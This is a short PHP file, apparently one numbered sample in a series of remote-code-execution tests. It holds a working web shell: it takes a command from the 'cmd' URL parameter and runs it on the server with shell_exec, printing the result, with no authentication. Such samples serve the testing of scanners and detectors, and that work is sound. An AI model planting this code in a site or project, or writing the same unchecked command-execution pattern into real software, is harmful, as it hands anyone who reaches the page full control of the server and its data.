<?php
// RCE test variation #853
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>